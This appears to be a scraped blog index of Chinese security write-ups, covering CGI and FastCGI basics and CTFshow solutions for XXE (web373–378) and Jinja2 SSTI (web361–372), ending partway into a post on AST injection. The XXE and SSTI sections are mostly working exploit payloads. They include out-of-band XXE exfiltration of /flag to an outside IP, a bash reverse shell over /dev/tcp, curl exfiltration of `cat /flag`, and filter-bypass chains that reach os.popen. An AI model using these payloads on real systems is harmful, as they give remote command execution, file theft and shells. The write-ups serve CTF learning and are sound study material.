public static void unserialize(Object obj) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} 参考： 白日梦组长(非常推荐这位up主) ErYao7","link":"/2023/11/06/CommonsCollections/"},{"title":"cgi，php-cgi，fastcgi 、php-fpm之间的关系","text":"前言在做一道ssrf题目时，提到了有关于FastCGI、PHP-FPM，不知道是什么东东 引出概念在整个网站架构中，Web Server（如Apache、Nginx）只是内容的分发者。举个栗子，如果客户端请求的是 index.html，那么Web Server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。 如果请求的是 index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。 当Web Server收到index.php 这个请求后，会启动对应的 CGI 程序，这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程，接下来再引出这些概念，会好理解很多。 CGI：是 Web Server 与 Web Application 之间数据交换的一种协议。 FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。 PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。 PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。 （Web Server 一般指Apache、Nginx、IIS、Tomcat等服务器，Web Application 一般指PHP、Java、Asp.net等应用程序） 概念1、CGICGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php、perl、tcl等。 WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。也就是说，CGI就是专门用来和 web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序（如php-cgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句，返回给web服服务器，WEB服务器再返回给客户端，这就是普通cgi的工作原理。（cgi程序，你就可以理解成遵循cgi协议编写的程序） 优点： CGI的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给web服务器和web应用(如提nginx和php)。他们通过cgi搭线来完成数据传递。这样做的好处了尽量减少2个的关联，使他们2变得更独立。 缺点： 但是CGI有个难受的地方，就是每一次web请求都会有启动和退出过程，也就是最为人诟病的fork-and-execute模式，这样一在大规模并发下，就死翘翘了。 2、FastCGI从根本上来说，FastCGI是用来提高CGI程序性能的。类似于CGI，FastCGI也可以说是一种协议。 FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次。 FastCGI是和语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中，并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。 举例： 当web server收到/index.php请求，看一下CGI程序和FastCGI程序分别是怎么处理的： CGI：当收到web server请求后，会启动对应的CGI程序，这里就是PHP的解析器（php-cgi）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定的CGI规定的格式返回处理后的结果，退出进程。（CGI每次接收到请求都会执行这些步骤） FastCGI：首先，FastCGI程序会先启动一个master，解析配置环境，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然是高。而且当worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源，这就是fastcgi对进程的管理。（CGI程序和FastCGI程序，可以理解成遵循CGI协议和FastCGI协议编写的程序） FastCGI的工作原理： FastCGI接口方式采用C/S结构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或者多个脚本解析守护进程。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程来执行，然后将得到的结果返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求，或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。 （1）Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等) （2）FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。 （3）当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 （4）FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。 CGI与FastCGI比较： （1）对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。 （2）由于FastCGI是多进程，所以比CGI多线程消耗更多的服务器内存，php-cgi解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。 3、PHP-FPM首先要说的是：fastcgi是一个协议，php-fpm实现了这个协议。 大家都知道，PHP的解释器是php-cgi。php-cgi只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理，所以就出现了一些能够调度php-cgi进程的程序，php-fpm就是这样的一个东西。它克服了php-cgi变更php.ini配置后，需重启php-cgi才能让新的php-ini生效，不可以平滑重启，直接杀死php-cgi进程，php就不能运行了的问题。修改php.ini之后，php-cgi进程的确没办法平滑重启的。php-fpm对此的处理机制是新的worker用新的配置，已经存在的worker处理完手上的活就可以歇着了，通过这种机制来平滑过度。 php-fpm提供了更好的php进程管理方式，可以有效的控制内存和进程，可以平滑重载php配置。 总结一下这个升级的过程： 如果要搭建一个高性能的PHP WEB服务器，目前最佳的方式是Apache/Nginx + FastCGI + PHP-FPM(+PHP-CGI)方式了。 结尾这篇文章转载于 大佬 我在我的vps中nginx用的就是 fastcgi+php-fpm 1234location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;}","link":"/2023/11/08/cgi%EF%BC%8Cphp-cgi%EF%BC%8Cfastcgi%20%E3%80%81php-fpm%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/"},{"title":"XXE漏洞","text":"什么是xxe漏洞？XXE全称是XML External Entity Injection，即外部实体注入。XXE是针对应用程序解析XML输入类型的攻击。当包含对外部实体的引用的 XML输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造。 什么是XML? XML 指可扩展标记语言（EXtensible Markup Language）。 XML 是一种很像HTML的标记语言。 XML 的设计宗旨是传输数据，而不是显示数据。 XML 标签没有被预定义。您需要自行定义标签。 XML 被设计为具有自我描述性。 XML实列XML 文档第一行以 XML 声明开始，用来表述文档的一些信息，如： 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 标签必须成对出现，有开始标签就需要有结束标签， XML 标签没有被预定义，通过 XML 您可以发明自己的标签，列如下面的 “site”,”name”,”url”,”desc”都是自定义的标签 XML 必须包含根元素，它是所有其他元素的父元素。下面案例中的根元素就是“site” 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;site&gt; &lt;name&gt;zIxyd&lt;/name&gt; &lt;url&gt;https://zixyd.github.io&lt;/url&gt; &lt;desc&gt;Blog&lt;/desc&gt;&lt;/site&gt; 什么是DTD？Document Type Definition 文档类型定义 DTD文件一般和XML文件配合使用，主要是为了约束XML文件。 XML文件引入DTD文件，这样XML可以自定义标签，但又受到DTD文件的约束 基本语法： 1&lt;!ELEMENT 元素名 类型&gt; DTD实列编写一个名为myClass.dtd的dtd文件 12345&lt;!ELEMENT 班级 (学生+)&gt;&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;&lt;!ELEMENT 名字 (#PCDATA)&gt;&lt;!ELEMENT 年龄 (#PCDATA)&gt;&lt;!ELEMENT 介绍 (#PCDATA)&gt; 编写一个xml文件并引入dtd文件 123456789101112131415&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!--引入dtd文件，约束这个xml--&gt;&lt;!DOCTYPE 班级 SYSTEM &quot;myClass.dtd&quot;&gt;&lt;班级&gt; &lt;学生&gt; &lt;名字&gt;周小星&lt;/名字&gt; &lt;年龄&gt;23&lt;/年龄&gt; &lt;介绍&gt;学习刻苦&lt;/介绍&gt; &lt;/学生&gt; &lt;学生&gt; &lt;名字&gt;林晓&lt;/名字&gt; &lt;年龄&gt;25&lt;/年龄&gt; &lt;介绍&gt;是一个好学生&lt;/介绍&gt; &lt;/学生&gt; &lt;/班级&gt; 引入中写的：SYSTEM，表示当前的DTD文件是本地的 如果写的是PUBLIC，则表示引入的DTD文件是来自于网络的. DTD文档的声明及引用1.内部DTD文档1&lt;!DOCTYPE 根元素 [定义内容]&gt; 2.外部DTD文档引入外部的DTD文档分为两种： （1）当引用的DTD文件是本地文件的时候，用SYSTEM标识，并写上”DTD的文件路径”，如下： 1&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt; （2）如果引用的DTD文件是一个公共的文件时，采用PUBLIC标识，如下方式： 1&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt; 补充关键(ENTITY)ENTITY属性：实体用于为一段内容创建一个别名，以后在XML文档中就可以使用别名引用这段内容了。 1,引用实体 1&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt; 举例 123&lt;!ENTITY copyright &quot;I am a programmer&quot;&gt;....&amp;copyright; 2,参数实体 1&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt; 举例 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!ELEMENT person (name,addr,tel,br,email)&gt;&lt;!ENTITY %name &quot;(#PCDATA)&quot;&gt;&lt;!ELEMENT addr %name;&gt;&lt;!ELEMENT tel %name;&gt;&lt;!ELEMENT br EMPTY&gt;&lt;!ELEMENT email %name;&gt; CTFSHOW_XMLweb373(入门xml)123456789101112&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $ctfshow = $creds-&gt;ctfshow; echo $ctfshow;}highlight_file(__FILE__); 1, libxml_disable_entity_loader函数可以加载外部实体 1可选。禁用 (TRUE) 或启用 (FALSE) libxml 扩展以加载外部实体。 默认为真 2, **file_get_contents(‘php://input’)**接受POST数据 3, simplexml_import_dom 函数把 DOM 节点转换为 SimpleXMLElement 对象 1234567&lt;?php$dom = new domDocument();$dom-&gt;loadXML('&lt;note&gt;&lt;from&gt;John&lt;/from&gt;&lt;/note&gt;');$xml = simplexml_import_dom($dom);echo $xml-&gt;from;?&gt; //输出John payload 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE any [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;anything&gt; &lt;ctfshow&gt; &amp;xxe; &lt;/ctfshow&gt;&lt;/anything&gt; web374 (无回显)123456789&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); 利用ENTITY中的参数实体 为区分嵌套实体和实体之间的关系，可以通过单双引号来间隔开，引号中嵌套一个参数实体，其%号需要写成：%也可写为16进制的% 只要明白参数实体，payload不就难理解 先在vps上创建一个dtd文件 123&lt;!ENTITY %dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM 'http://81.71.13.76:5050/%file'&gt;&quot;&gt;%dtd;%xxe; 再vps利用nc监听端口 5050，再发送xml数据 1234567&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY % aaa SYSTEM &quot;http://81.71.13.76:8080/xml.dtd&quot;&gt;%aaa;]&gt;&lt;!--XML 必须包含根元素--&gt;&lt;root&gt;1&lt;/root&gt;&lt;&gt; 为什么不直接将dtd文件放到xml数据中，而必须去引入？不可以写成写成下面这种形式？ 1234567&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY %dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM 'http://81.71.13.76:5050/%file'&gt;&quot;&gt;%dtd;%xxe;]&gt;&lt;root&gt;1&lt;/root&gt; web375 -web376(无回显,过滤了&lt;?xml version=”1.0”) XML的声明是可以省略的，所以和374是一样的解法 12345678910111213&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;/', $xmlfile)){ die('error');}if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); web377(无回显,过滤了&lt;?xml version=”1.0”和“http”) 123456789101112&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;|http/i', $xmlfile)){ die('error');}if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); 一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。 在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。 外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。 意思是可以对xml文档UTF-16编码 123456789import requestsurl = 'http://f20c0eb6-2aea-496b-8411-94f78f0ae0a4.challenge.ctf.show/'data = '''&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY % aaa SYSTEM &quot;http://81.71.13.76:8080/xml.dtd&quot;&gt;%aaa;]&gt;&lt;root&gt;1&lt;/root&gt;'''r = requests.post(url=url,data=data.encode('utf-16')) web378 尝试弱密码登陆，显示登陆成功却没有反应，用bp抓包,很明显是xml数据 1&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt; payload: 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE any [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt; &lt;username&gt; &amp;xxe; &lt;/username&gt; &lt;password&gt; admin &lt;/password&gt;&lt;/user&gt; 防范XXE 禁用 XML 解析器中的外部实体处理 验证传入的 XML 数据，以确保其仅包含允许的实体 使用安全的库和 API 处理 XML 数据 实施适当的输入验证，防止恶意的 XML 输入","link":"/2023/11/09/XXE/"},{"title":"SSTI漏洞","text":"ssti常用命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__class__ 类的一个内置属性，表示实例对象的类。__base__ 类型对象的直接基类__bases__ 类型对象的全部基类（除object），以元组形式，类型的实例通常没有属性。 __bases____mro__ 此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__() 返回这个类的所有子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ 初始化类，返回的类型是function__globals__ 使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')__builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]__str__() 返回描写这个对象的字符串，可以理解成就是打印出来。url_for flask的一个方法，可以调用当前脚本中的函数，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。lipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__.os.popen('ls').read()}}current_app 应用上下文，一个全局变量。request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()request.args.x1 get传参request.values.x1 所有参数request.cookies cookies参数request.headers 请求头参数request.form.x1 post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data post传参 (Content-Type:a/b)request.json post传json (Content-Type: application/json)config 当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}self.__dict__ 保存当前类实例或对象实例的属性变量键值对字典，{%print(&quot;DMIND&quot;)%} 控制语句中也能输出拼接字符：{% set ind=dict(ind=a,ex=a)|join%} 变量ind=index获取字符：{{lipsum|string|list|attr('pop')(18)}} 相当于：lipsum|string|list|attr('pop')(18) 输出：_（下划线）得到数字：{{lipsum|string|list|attr('index')('g')}} 相当于lipsum|string|list|attr('index')('g') 输出：10运算出其他数字：{% set shiba=ten%2bten-two %} %2b是URL编码后的加号得到数字：{{dict(a=a)|lower|list|count}}得到16运算出其他数字：{{dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count}}得到1得到任意字符：{{dict(dmind=a)|slice(1)|first|first}}得到dmind获取__builtins__属性：{{lipsum.__globals__|attr('get')('__builtins__')}} 利用get()、pop()获取属性，相当于lipsum.__globals__.get('__builtins__')lipsum.__globals__.__builtins__ 相当于 lipsum|attr('__globals__')|attr('get')('__builtins__')lipsum.__globals__.__builtins__.chr(95) 相当于 lipsum|attr('__globals__')|attr('get')('__builtins__')|attr('get')('chr')(95)得到chr函数：{%set chr=lipsum.__globals__.__builtins__.chr%}利用chr()得到字符：{{chr(47)~chr(32)}} 47是/ 32是空格 ~是连接符利用os执行命令：lipsum.__globals__.os.popen('dir').read() 相当于 lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('dir')|attr('read')()类似的 url_for['__globals__']['os']['popen']('dir').read()简单的读取文件：url_for[&quot;__globa&quot;+&quot;ls__&quot;].__builtins__.open(&quot;flag.txt&quot;).read()在能执行eval情况下：eval(__import__('so'[::-1]).__getattribute__('syste'%2b'm')('curl http://xxx:4567?p=`cat /f*`')) ssti常用过滤器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960attr(): attr用于获取变量(过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器) &quot;&quot;|attr(&quot;__class__&quot;) 相当于 &quot;&quot;.__class__ dict(po=ll,p=abc)|join ：连接键名，拼接得到popint()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：{{ &quot;%s&quot; - &quot;%s&quot;|format('Hello?',&quot;Foo!&quot;) }}将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()返回字符串的长度，别名是count web361_(入门ssti)啥都没有过滤,所以可以用很多方法 1234567{{url_for.__globals__.os.popen('cat /flag').read()}}{{url_for.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cat /flag').read()&quot;)}}{{&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()')}} 123456789101112import requestsurl_base = &quot;http://26ecb42c-4859-430a-8b81-7476a70fba72.challenge.ctf.show?name=&quot;for i in range(500): url = url_base +&quot;{{''.__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]}}&quot; response = requests.get(url=url) if response.status_code == 200: if 'os._wrap_close' in response.text: print(i) break print(i) 1{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']('__import__(\\&quot;os\\&quot;).popen(&quot;bash -c \\'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5050 0&gt;&amp;1\\'&quot;).read()')}} web362_(数字)可以用全角绕过过滤的数字，也可以使用不用数字的payload 1{{&quot;&quot;.__class__.__base__.__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}} web363_(‘ “)利用requst.arg绕过 1{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.cmd).read()}}&amp;popen=popen&amp;cmd=cat /flag web364_(‘ “ args)利用request.cookie绕过 123{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.cookies.popen](request.cookies.cmd).read()}}Cookie:popen=popen;cmd=cat /flag web365_([ ])增加过滤了**[ ]**,可以用__getitem()__绕过 123456789().__class__.__mro__.__getitem__(-1){{().__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.cookies.popen)(request.cookies.cmd).read()}} Cookie:cmd=cat /flag;popen=popen============================================================={{url_for.__globals__.os.popen(request.cookies.cmd).read()}}Cookie:cmd=cat /flag web366_(下划线)利用attr过滤器绕过 1234{{lipsum.__globals__.os.popen('ls').read()}}{{(lipsum|attr(request.cookies.globals)).os.popen(reqeuest.cookies.cmd).read()}}Cookie:cmd=cat /flag;globals=__globals__ web367_(os)过滤了字符os，那就把os写到request里面就行了 12345x.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls /').read()&quot;){{(x|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookies.getitem))(request.cookies.builtins).eval(request.cookies.cmd)}}Cookie:init=__init__;globals=__globals__;getitem=__getitem__;builtins=__builtins__;cmd=__import__('os').popen('cat /flag').read() web368_(大括号)过滤了{{,}},可以用{% %} 使用request.values.x，values可以接受GET和POST形式的传参,注意get(request.values.b)中的get根据你的传参方式来的 1234{% print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&amp;a=__globals__&amp;b=os&amp;c=cat /flag web369_(request)过滤了request,利用dict()|join拼接我们需要的字符 12345678910{% set po=dict(po=a,p=a)|join%} # dict()|join 拼接键名的方式，此处得到变量po=pop{% set a=(()|select|string|list)|attr(po)(24)%} #通过pop(24)选择到“_”下划线并赋值给a{% set ini=(a,a,dict(init=a)|join,a,a)|join()%} #ini=__init__{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} #glo=__globals__{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} #geti=__getitem__{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} #built=__builtins__{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} #x=q.__init__.__globals__.__getitem__('__builtins__'){% set chr=x.chr%} #chr=x.chr 选择到了chr函数，chr=&lt;built-in function chr&gt;{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%} #结合ASCII和chr函数构造。file=/flag{%print(x.open(file).read())%} #利用open函数读取 web370_(0-9)将上一题的数字用全角替换 12345678910{% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%} {% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}{%print(x.open(file).read())%} 也可以用count或者length 123456789101112131415{% set two=(dict(aa=a)|join|count)%}{% set three=(dict(aaa=a)|join|count)%}{% set four=(dict(aaaa=a)|join|count)%}{% set seven=(dict(aaaaaaa=a)|join|count)%}{% set eight=(dict(aaaaaaaa=a)|join|count)%}{% set nine=(dict(aaaaaaaaa=a)|join|count)%}{% set ten=(dict(aaaaaaaaaa=a)|join|count)%}{% set twofour=( two~four)|int%}{% set a=(()|select|string|list).pop(twofour)%}{% set globals=(a,a,dict(globals=s)|join,a,a)|join%}{% set init=(a,a,dict(init=v)|join,a,a)|join%}{% set builtins=(a,a,dict(builtins=c)|join,a,a)|join%}{% set a=(lipsum|attr(globals)).get(builtins)%}{% set chr=a.chr%}{% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read()%} web371_(print)过滤了print，将flag内容发送到vps 1234567891011s='__import__(&quot;os&quot;).popen(&quot;curl http://81.71.13.76:5555?p=`cat /flag`&quot;).read()'def fun(s): t='' for i in range(len(s)): if i&lt;len(s)-1: t+='chr('+(str(ord(s[i])))+')%2b' else: t+='chr('+(str(ord(s[i])))+')' return tprint(fun(s))#再将数字转成全角 1234567891011121314{% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%}{% set cmd=chr(９５)%2bchr(９５)%2bchr(１０５)%2bchr(１０９)%2bchr(１１２)%2bchr(１１１)%2bchr(１１４)%2bchr(１１６)%2bchr(９５)%2bchr(９５)%2bchr(４０)%2bchr(３４)%2bchr(１１１)%2bchr(１１５)%2bchr(３４)%2bchr(４１)%2bchr(４６)%2bchr(１１２)%2bchr(１１１)%2bchr(１１２)%2bchr(１０１)%2bchr(１１０)%2bchr(４０)%2bchr(３４)%2bchr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(５６)%2bchr(４９)%2bchr(４６)%2bchr(５５)%2bchr(４９)%2bchr(４６)%2bchr(４９)%2bchr(５１)%2bchr(４６)%2bchr(５５)%2bchr(５４)%2bchr(５８)%2bchr(５３)%2bchr(５３)%2bchr(５３)%2bchr(５３)%2bchr(６３)%2bchr(１１２)%2bchr(６１)%2bchr(９６)%2bchr(９９)%2bchr(９７)%2bchr(１１６)%2bchr(３２)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(９６)%2bchr(３４)%2bchr(４１)%2bchr(４６)%2bchr(１１４)%2bchr(１０１)%2bchr(９７)%2bchr(１００)%2bchr(４０)%2bchr(４１)%}{%if x.eval(cmd)%}abc{%endif%} web372_(count)用上一题的将数字变成全角的payload照样可以，","link":"/2023/11/10/web361_(%E5%85%A5%E9%97%A8ssti)/"},{"title":"AST Injection","text":"模版引擎是什么JS web开发中常用的模版引擎如 ejs、pug、handlebars 功能：动态渲染HTML代码，创建可重复使用的页面结构 ejs 模版使用123456789101112131415// 安装EJS模块：npm install ejs// 引入EJS模块const ejs = require('ejs');// 定义模板const template = ` &lt;h1&gt;Hello, &lt;%= name %&gt;!&lt;/h1&gt;`;// 渲染模板const data = { name: 'John' };const html = ejs.render(template, data);console.log(html); handlebars 模版使用123456789101112131415161718// 安装Handlebars模块：npm install handlebars// 